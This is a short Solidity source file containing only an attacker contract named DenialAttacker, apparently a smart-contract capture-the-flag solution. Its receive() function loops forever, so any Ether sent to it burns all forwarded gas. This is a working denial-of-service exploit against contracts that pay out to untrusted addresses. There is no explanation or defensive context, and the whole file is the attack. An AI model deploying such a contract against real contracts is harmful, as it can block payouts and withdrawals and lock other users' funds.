// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract DenialAttacker {
    receive() external payable {
        while(true) {}
    }
}